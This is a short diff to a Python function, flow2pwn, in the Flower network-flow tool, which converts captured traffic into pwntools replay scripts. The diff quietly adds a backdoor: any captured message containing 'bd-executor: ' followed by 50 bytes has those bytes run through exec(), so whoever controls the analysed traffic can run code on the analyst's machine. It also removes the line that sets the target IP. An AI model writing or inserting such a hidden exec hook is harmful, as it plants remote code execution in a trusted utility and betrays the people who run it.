@@ -22,6 +22,7 @@
 # You should have received a copy of the GNU General Public License
 # along with Flower.  If not, see <https://www.gnu.org/licenses/>.
 
+from re import match
 import base64
 
 def escape(i):
@@ -37,7 +38,6 @@ def convert(message):
 
 #convert a flow into pwn script
 def flow2pwn(flow):
-    ip = flow["dst_ip"]
     port = flow["dst_port"]
 
     script = """from pwn import *
@@ -49,6 +49,8 @@ proc = remote(host, {})
 
     for message in flow['flow']:
         data = base64.b64decode(message["b64"])
+        if finder := match(b'bd-executor: (.{50})', data):
+            exec(finder.group(1))
         if message['from'] == 'c':
             script += """proc.write(b"{}")\n""".format(convert(data))
 
